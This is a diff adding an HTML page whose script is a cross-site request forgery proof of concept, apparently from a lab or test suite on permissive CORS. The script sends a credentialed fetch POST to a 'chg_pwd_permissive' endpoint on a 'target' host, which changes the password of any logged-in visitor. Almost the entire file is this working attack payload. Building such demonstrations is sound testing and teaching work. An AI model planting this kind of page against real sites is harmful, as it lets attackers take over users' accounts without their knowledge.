@@ -1,0 +1,20 @@
+<html>
+<body>
+
+<script>
+  fetch("http://target:8000/xploitSCC/chg_pwd_permissive", {
+        method: "POST",
+        body: JSON.stringify({"new_password" : "New_Password_changed_from_Fetch_JSON_Permissive_CORS"}),
+        headers: {
+          'Content-Type': 'application/json'                          
+        },
+        credentials: 'include'
+    })
+    .then(response => response.text())
+    .then((response) => {
+        console.log(response);
+    });
+</script>
+
+</body>
+</html>
